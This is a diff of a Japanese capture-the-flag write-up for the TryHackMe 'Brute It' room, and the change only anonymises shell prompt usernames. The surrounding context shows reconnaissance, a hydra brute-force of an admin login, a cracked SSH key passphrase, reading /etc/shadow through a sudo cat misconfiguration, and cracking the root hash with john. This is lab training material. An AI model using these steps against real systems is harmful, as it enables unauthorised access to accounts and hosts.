@@ -28,7 +28,7 @@
     
     <article class="writeup-body">
       <p><code>--script=vuln</code></p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ nmap 10.48.143.111 --script=vuln
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 11:17 +0900
 Nmap scan report for 10.48.143.111
@@ -56,7 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds
 </code></pre>
 <p><code>/admin</code>ディレクトリが攻めどころかな？</p>
 <p><code>-sV -sC</code></p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ nmap -sV -sC -oX scan.xml -T4 -p- 10.48.143.111
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 11:17 +0900
 Nmap scan report for 10.48.143.111
@@ -77,7 +77,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 81.57 seconds
 </code></pre>
 <p><code>feroxbuster</code></p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ feroxbuster -u http://10.48.143.111    
 
  ___  ___  __   __     __      __         __   ___
@@ -114,7 +114,7 @@ by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
 <p><code>searchsploit</code>でエクスプロイトを探したがこれも見つからず</p>
 <hr>
 <p>adminページを見てみるとUSERNAMEとPASSWORDの入力フォームがあった</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ curl http://10.48.143.111/admin/
 
 &lt;!DOCTYPE html&gt;
@@ -145,14 +145,14 @@ by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
 &lt;/body&gt;
 &lt;/html&gt;
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ 
 </code></pre>
 <p>どうみてもここにbruteforceだ</p>
 <p>試しに適当なパスワードを送信してみる<br>
 これはGUIで入力することもできるがCLIからもできる<br>
 <code>curl -X POST -d "user=admin&amp;pass=test" http://10.48.143.111/admin/</code>を使う</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Downloads]
 └─$ curl -X POST -d &quot;user=admin&amp;pass=test&quot; http://10.48.143.111/admin/
 
 &lt;!DOCTYPE html&gt;
@@ -218,7 +218,7 @@ by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
 </ol>
 </li>
 </ul>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.143.111 http-post-form &quot;/admin/:user=^USER^&amp;pass=^PASS^:F=Username or password invalid&quot;
 Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -264,7 +264,7 @@ x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
 -----END RSA PRIVATE KEY-----
 </code></pre>
 <p>CLIからも見たいが遷移してくれなかった</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Downloads]
 └─$ curl -X POST -d &quot;user=admin&amp;pass=xavier&quot; http://10.48.143.111/admin/
 
 &lt;!DOCTYPE html&gt;
@@ -318,7 +318,7 @@ x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
 </tr>
 </tbody>
 </table>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Downloads]
 └─$ curl -c cookie.txt -b cookie.txt -L -X POST -d &quot;user=admin&amp;pass=xavier&quot; http://10.48.143.111/admin/
 
 &lt;!DOCTYPE html&gt;
@@ -335,29 +335,29 @@ x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
 &lt;/body&gt;
 &lt;/html&gt;
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+┌──(kali㉿kali-1-kalija)-[~/Downloads]
 └─$ 
 </code></pre>
 <p>あとは秘密鍵を格納してそれを使ってsshログインすればよい</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ vim id_rsa                  
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ ll
 合計 8
--rw-rw-r-- 1 rkametani rkametani 1766  5月 14 11:51 id_rsa
--rw-rw-r-- 1 rkametani rkametani 3581  5月 14 11:18 scan.xml
+-rw-rw-r-- 1 kali kali 1766  5月 14 11:51 id_rsa
+-rw-rw-r-- 1 kali kali 3581  5月 14 11:18 scan.xml
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ chmod 600 id_rsa                
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ ll
 合計 8
--rw------- 1 rkametani rkametani 1766  5月 14 11:51 id_rsa
--rw-rw-r-- 1 rkametani rkametani 3581  5月 14 11:18 scan.xml
+-rw------- 1 kali kali 1766  5月 14 11:51 id_rsa
+-rw-rw-r-- 1 kali kali 3581  5月 14 11:18 scan.xml
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ ssh -i id_rsa john@10.48.143.111
 The authenticity of host '10.48.143.111 (10.48.143.111)' can't be established.
 ED25519 key fingerprint is: SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM
@@ -372,14 +372,14 @@ Enter passphrase for key 'id_rsa':
 <p><code>id_rsa</code>を作成して、パーミッションを変更したのだが<br>
 パスフレーズを求められた<br>
 秘密鍵ファイルからパスワード解析用のハッシュ情報を抽出してパスフレーズの特定という作業を実施する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ ssh2john id_rsa &gt; id_rsa.hash   
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ ls
 id_rsa  id_rsa.hash  scan.xml
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -392,12 +392,12 @@ rockinroll       (id_rsa)
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed. 
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ 
 </code></pre>
 <p><code>rockinroll</code>がパスフレーズだ</p>
 <p>再度sshログインを試みる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ ssh -i id_rsa john@10.48.143.111
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
@@ -504,14 +504,14 @@ john@bruteit:~$
 </code></pre>
 <p><code>sudo -l</code>を実施すると<code>/bin/cat</code>がNOPASSWDで使えるらしかったので<code>/etc/passwd</code>と<code>/etc/shadow</code>を見た<br>
 shadowの中にある<code>root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::</code>これ確か<code>$6</code>がSHA512の識別子でクラック可能だった気がする</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::' &gt; hash.txt
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ cat hash.txt                      
 root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
@@ -523,7 +523,7 @@ football         (root)
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed. 
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/bruteIt]
 └─$ 
 </code></pre>
 <p><code>football</code>が取れた<br>
